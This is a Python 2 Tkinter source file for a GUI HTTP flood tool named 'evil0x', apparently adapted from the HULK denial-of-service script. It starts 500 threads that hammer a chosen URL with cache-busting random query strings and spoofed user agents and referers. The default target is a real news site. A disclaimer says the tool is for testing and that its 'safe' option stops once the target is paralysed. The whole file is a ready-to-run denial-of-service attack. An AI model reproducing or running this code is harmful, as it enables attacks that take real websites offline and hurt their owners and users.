# -*-coding:utf-8-*-

from Tkinter import *
import tkMessageBox

import urllib2
import pdb
import sys
import threading
import random
import re

root = Tk()
root.title("evil0x")
root.geometry('400x300')
	
# global params
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
safe_ = IntVar()
url = ''
url_ = StringVar()
url_.set('http://www.sina.com.cn')  # <input your url>

def inc_counter():
	global request_counter
	request_counter += 1

def set_flag(val):
	global flag
	flag = val

def set_safe():
	global safe
	safe = 1
	
# generates a user agent array
def useragent_list():
	global headers_useragents
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
# builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)
	
# http request
def httpcall(url):
	global log
	useragent_list()
	referer_list()
	code = 0
	if url.count("?") > 0:
		param_joiner = "&"
	else:
		param_joiner = "?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10)))
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5, 10)))
	request.add_header('Keep-Alive', random.randint(110, 120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host', host)
	try:
		urllib2.urlopen(request)
	except urllib2.HTTPError, e:
		# print e.code
		set_flag(1)
		log.insert(1.0, 'Response Code 500\n')
		code = 500
	except urllib2.URLError, e:
		# print e.reason
		log.insert(1.0, 'request was refused...\n')
		sys.exit()
		
	else:
		inc_counter()
		urllib2.urlopen(request)
	return(code)		

# http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag < 2:
				code = httpcall(url)
				if (code == 500) & (safe == 1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		global log
		previous = request_counter
		while flag == 0:
			if (previous + 100 < request_counter) & (previous <> request_counter):
				log.insert(1.0, "%d Requests Sent\n" % (request_counter))
				previous = request_counter
		if flag == 2:
			log.insert(1.0, "--  Attack Finished --\n")
			
def safeBtnChanged():
	safe = safe_.get()

def checkUrl():
	'''
	检查URL输入格式
	'''
	global url
	global host
	url = url_.get()
	if url.count("/") == 2:
		url = url + "/"
	m = re.search('http\://([^/]*)/?.*', url)
	if m is None:
		tkMessageBox.showinfo("Tip", "your input URL is error format，and must be stared by 'http://'.")
		return False
	else:
		host = m.group(1)
		return True

def goBtnClicked():
	'''
	GO按钮点击事件
	'''
	global headers_useragents
	global headers_referers
	global request_counter
	global flag
	
	if goBtn['text'] == 'GO':
		if checkUrl():
			goBtn['text'] = 'STOP'
			headers_useragents = []
			headers_referers = []
			request_counter = 0
			flag = 0
			
			log.insert(1.0, "--  Attack Started --\n")
			for i in xrange(500):
				t = HTTPThread()
				t.start()
			t = MonitorThread()
			t.start()
	else:
		goBtn['state'] = DISABLED
		waitExit()
		goBtn['text'] = 'GO'
		goBtn['state'] = NORMAL

def waitExit():
	set_flag(2)
	# 等待所有线程结束
	while(threading.activeCount() <> 1):
		pass
	
def exitWindows():
	waitExit()
	root.destroy()
	
#if __name__ == '__main__':

frame1 = Frame(root, width=50)
frame1.pack(pady=10)
Label(frame1, text='URL:').pack(side=LEFT)

	# URL编辑框
Entry(frame1, width=32, textvariable=url_).pack(side=LEFT)
	# safe复选框
Checkbutton(frame1, text='safe', variable=safe_, onvalue=1, offvalue=0, command=safeBtnChanged).pack(side=LEFT)
	# go按钮
goBtn = Button(frame1, text='GO', command=goBtnClicked)
goBtn.pack(side=RIGHT)

frame2 = LabelFrame(root, width=50, text='Log')
frame2.pack(padx=10, pady=5)
	# log日志框
log = Text(frame2)
log.pack(side=LEFT)
log.insert(1.0, "免责声明：我们复写这段程序只用作测试，任何非法使用我们概不负责，另外建议选择safe，选择safe则当目标瘫痪后自动停止攻击，另外有效性和服务器负载有很大关系")
	# 窗口退出前，结束所有任务
root.protocol('WM_DELETE_WINDOW', exitWindows)
root.mainloop()
	
